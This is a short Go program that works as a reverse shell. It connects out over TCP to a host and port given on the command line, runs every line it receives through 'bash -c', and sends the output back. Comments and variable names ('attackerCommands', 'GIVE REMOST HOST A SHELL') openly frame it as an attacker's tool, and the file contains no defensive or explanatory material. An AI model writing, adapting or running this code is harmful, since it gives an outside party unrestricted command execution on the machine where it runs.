package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide host:port.")
		return
	}

	CONNECT := arguments[1]
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	/*
		for {
			reader := bufio.NewReader(os.Stdin)
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			fmt.Fprintf(c, text+"\n")

			message, _ := bufio.NewReader(c).ReadString('\n')
			fmt.Print("->: " + message)
			if strings.TrimSpace(string(text)) == "STOP" {
				fmt.Println("TCP client exiting...")
				return
			}
		} */

	//COMMANDS TO GIVE REMOST HOST A SHELL

	for {
		attackerCommands, _ := bufio.NewReader(c).ReadString('\n')
		cmd := exec.Command("bash", "-c", attackerCommands)
		if err != nil {
			log.Fatalln(err)
		}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}

func getUID() {

}
